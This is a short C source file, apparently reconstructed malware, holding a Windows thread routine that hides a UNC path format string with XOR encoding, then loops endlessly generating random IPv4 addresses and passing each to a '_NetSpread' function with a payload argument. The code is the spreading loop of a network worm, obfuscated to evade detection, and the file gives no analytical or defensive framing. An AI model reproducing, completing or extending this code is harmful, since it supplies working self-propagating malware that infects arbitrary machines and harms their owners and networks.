#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>   // added for sprintf
#include <string.h>
#include <stdbool.h>
#include <stddef.h>  // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

DWORD WINAPI extra(LPVOID Data)
{
    DWORD tick_count;
    int rand_val1, rand_val2, rand_val3, rand_val4;
    char local_5c[64];
    LPCSTR param_1 = (LPCSTR)Data;

    // Format string "\\\\%d.%d.%d.%d" XOR'd with key 0x5A
    volatile char sz_fmt[] = {
        '\\'^0x5A, '\\'^0x5A, '%'^0x5A, 'd'^0x5A, '.'^0x5A, '%'^0x5A, 'd'^0x5A, '.'^0x5A,
        '%'^0x5A, 'd'^0x5A, '.'^0x5A, '%'^0x5A, 'd'^0x5A, 0x00^0x5A
    };
    xor_decrypt(sz_fmt, sizeof(sz_fmt), 0x5A);

    do {
        tick_count = GetTickCount();
        srand(tick_count);
        memset(local_5c, 0, sizeof(local_5c));
        rand_val1 = rand() % 0x100;
        rand_val2 = rand() % 0x100;
        rand_val3 = rand() % 0x100;
        rand_val4 = rand() % 0x100;
        sprintf(local_5c, (char*)sz_fmt, rand_val4, rand_val3, rand_val2, rand_val1);
        _NetSpread((uint32_t)local_5c, param_1);
    } while (true);
}
#pragma optimize("", on)
